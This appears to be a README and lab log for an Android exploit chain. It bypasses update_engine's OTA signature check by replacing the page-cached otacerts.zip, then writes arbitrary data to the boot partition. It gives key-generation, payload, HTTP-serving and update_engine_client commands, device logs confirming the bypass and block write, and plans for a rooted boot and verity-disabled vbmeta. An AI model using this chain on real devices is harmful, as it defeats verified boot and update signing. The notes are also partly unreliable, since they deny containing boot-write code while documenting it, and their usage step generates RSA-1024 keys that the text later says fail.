# update_engine payload probe

离线生成并验证一个最小 update_engine full payload，用于评估"证书页替换 + system_app
触发"路线。**不包含在设备上写 boot/vbmeta 的代码。**

## 组件

| 文件 | 作用 |
|---|---|
| `mkpayload.py` | 生成 `payload_empty.bin`（空分区列表）和 1135 字节的 `otacerts_ours.zip`（内含本目录 `ota_cert.pem`） |
| `verify_payload.py` | 用 `ota_cert.pem` 校验 payload 的 metadata 签名 |
| `ota_key.pem` / `ota_cert.pem` | 本地生成的 RSA-1024 测试密钥/证书（**不入仓**） |

## 已确认的事实（2026-10-27）

1. **update_engine 每次 apply 都重新读证书**：AOSP 11 `delta_performer.cc` 的
   `CreatePayloadVerifier()` 在 metadata 解析时调用
   `PayloadVerifier::CreateInstanceFromZipPath(update_certificates_path_)`；
   真机 log 每次 update 都出现
   `Verifying using certificates: /system/etc/security/otacerts.zip`。
2. **system_app 可以触发 update_engine**：`update_engine_client --cancel` 返回
   `Status(-8, EX_SERVICE_SPECIFIC): '1: No ongoing update to cancel.'`，
   不是权限拒绝。
3. **HTTP payload 可用**：`adb reverse tcp:8080 tcp:8080` + 主机 `http.server`，
   update_engine 成功 `GET /payload_empty.bin` 并解析。
4. **payload 格式已对齐**：`CrAU` + 大端 version u64 + 大端 manifest_size u64 +
   大端 metadata_signature_size u32；签名对象是 `header + manifest`
   （`metadata_size_ = manifest_offset + manifest_size`）。
5. **基线错误正是签名门**：

   ```
   Verifying using certificates: /system/etc/security/otacerts.zip
   Failed to verify the signature with 1 keys.
   Manifest hash verification failed.
   ErrorCode::kDownloadMetadataSignatureMismatch (26)
   ```

   这说明一旦把 `otacerts.zip` 的页缓存换成 `otacerts_ours.zip`，
   同一个 payload 应能通过 metadata 签名。

## 用法

```bash
# 1. 生成测试密钥/证书（只需一次；不要提交私钥）
openssl req -x509 -newkey rsa:1024 -keyout ota_key.pem -out ota_cert.pem \
  -days 3650 -nodes -subj "/CN=p780"

# 2. 生成 payload 与替换用 otacerts zip
python mkpayload.py
python verify_payload.py   # 期望 "0 Verified OK"

# 3. 主机起 HTTP 服务
python -m http.server 8080 --bind 127.0.0.1
adb reverse tcp:8080 tcp:8080

# 4. 以 system_app 触发（需已有 Zygote system_app shell）
update_engine_client --update \
  --payload=http://127.0.0.1:8080/payload_empty.bin \
  --headers=$'FILE_SIZE=...\nFILE_HASH=...\nMETADATA_SIZE=27\nMETADATA_HASH=...'
```

`METADATA_SIZE` 是 `24 + manifest_size`（不含 signature）；`METADATA_HASH` 是
`sha256(payload[0:METADATA_SIZE])` 的 base64。

## 证书页替换已实测（2026-10-27）

`app/` 里的小 APK 已完成页写（`after len=1135 match=true`），紧接着触发 update_engine：

```
Verifying using certificates: /system/etc/security/otacerts.zip
signature blob size = 267
Verified correct signature 1 out of 1 signatures.
Metadata hash signature matches value in Omaha response.
```

即 **签名门已绕过**。之后遇到两个小问题：

- `kPayloadTimestampError`：manifest 的 `max_timestamp` 默认为 0；已在
  `mkpayload.py` 里设为 2100-01-01；
- 空分区 manifest 会让 `DeltaPerformer::Write` SIGSEGV；下一步需要带
  `partition` / `REPLACE` operation 的合法 payload。

### 关键坑

- update_engine 的 `PadRSASHA256Hash()` **只接受 RSA-2048 / RSA-4096**；
  RSA-1024 会在验签前失败。已改用 RSA-2048（证书 zip 947 B，可放进 1135 B）。
- page cache 可能被回收：写完证书页后要**立刻**触发 update_engine，
  否则会回落到原始证书。重启设备即可恢复原始页。

## 块写路径已实测（2026-10-27）

`mkpayload_boot.py` 生成一个带 `partition=boot`、一条 `REPLACE`（4096 B）
和完整 payload 签名的 payload。实测 update_engine：

```
PartitionInfo new boot sha256: xiIAVJPEy3Xz4I7aTMC/4XLixe7KZh7EkIxUkPw9aZQ= size: 4096
Opening /dev/block/bootdevice/by-name/boot_a partition without O_DSYNC
Applying 1 operations to partition "boot"
Completed 1/1 operations (100%)
FilesystemVerifierAction: Hashing partition 0 (boot) ... kSuccess
PostinstallRunnerAction ... kSuccess
finished last action PostinstallRunnerAction with code ErrorCode::kUpdatedButNotActive
```

`kUpdatedButNotActive` 是因为 headers 里设了 `SWITCH_SLOT_ON_REBOOT=0`；
写路径本身已经完整成功（真正的块设备写 + 分区哈希校验）。

## 下一步

- 用同一格式生成两个 partition 的 payload：`boot`（完整镜像）与 `vbmeta`
  （testkey 重签、`--flags 2` 关闭 verity、去掉 boot 描述符）；
- 先把目标槽 A 写成可启动的 rooted/permissive boot + 对应 vbmeta，
  再设 `SWITCH_SLOT_ON_REBOOT=1`，重启进入 A；
- 注意目标槽：当前 `ro.boot.slot_suffix=_b`，update_engine 默认 target A；
  基线失败已把 A 标成 unbootable，活动槽 B 不受影响。

## 边界

- 本目录不包含 boot/vbmeta 写入逻辑；
- `ota_key.pem` 仅是测试密钥，不能用于真实 OTA；
- 设备上的 update_engine 可能已把目标槽标记为 unbootable（基线测试副作用），
  当前活动槽仍是 `_b`。
